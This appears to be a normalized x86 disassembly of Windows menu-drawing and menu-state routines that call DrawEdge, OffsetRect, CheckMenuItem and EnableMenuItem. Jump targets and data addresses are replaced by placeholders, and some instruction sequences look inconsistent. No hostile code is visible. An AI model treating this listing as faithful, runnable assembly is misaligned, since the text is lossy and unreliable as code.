cmp [ eax - 0x21 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452cc3
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x59 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x21 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_4512e4
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
call sub_452214
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_452cdc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_45355e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_422084
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x2d ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x2d ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x2d ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404828
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x3c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_422084
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x35 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x3d ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x3d ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x3c ]
call sub_44f260
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4224e8
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x35 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x3d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x35 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x35 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x3c ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x3c ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x3c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x59 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x59 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x3d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_421cd8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x44 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x35 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0x8000000d
call sub_421ce0
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x58 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0x8000000f
call sub_421ce0
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_422084
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_421cd8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x44 ] eax
mov edx 0x80000014
mov eax 0x8000000f
call sub_42896c
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_421cb4
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_422084
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x3c ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x3c ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x58 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x2d ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x60 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x61 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4224e8
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_422084
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42677c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
xor eax eax
push ebp
push sub_4530b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x48 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x48 ]
call sub_4278c4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x44 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0x80000012
call sub_421514
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x48 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x3c ]
call sub_44f260
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_421ce0
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x35 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x21 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x60 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
call sub_452214
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x58 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x54 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_4217e0
mov eax [ ebp + 0x8 ]
or [ eax - 0x60 ] 0x100000
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4224e8
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_422210
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x58 ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x48 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x3c ]
call sub_44f778
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_421fd8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_421514
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x48 ]
call sub_4036c0
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x21 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x60 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
call sub_452214
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453565
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x59 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_4512e4
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_422348
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x21 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov ecx [ ebp - 0x4 ]
call sub_452214
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_453694
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_454078
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_4536c4
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_453710
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4538f2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_4038bc
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_4536c4
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_454078
mov esi eax
mov eax edi
call sub_453694
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_404828
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402fc4
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov bl [ esi + 0x60 ]
jmp r-xdata
mov si [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_4044c4
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_4512e4
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_404730
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4538f9
lea eax [ ebp - 0x24 ]
call sub_40442c
lea eax [ ebp - 0x10 ]
call sub_40442c
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
xor eax eax
mov al bl
mov ax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_452214
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_453924
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_404828
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_404480
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45394c
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_453abc
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_453acc
cmp ebx eax
je r-xdata
mov dl [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_453994
sub_453994
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_452184
push eax
call CheckMenuItem
mov eax esi
call sub_45394c
sub_4539e8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_453abc
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_452184
push eax
call EnableMenuItem
sub_453a60
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_453e20
mov edx eax
mov ecx ebx
mov eax edi
call sub_452124
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_45394c
sub_453acc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_4161a0
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_451238
sub_453b3c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_453abc
test esi esi
jge r-xdata
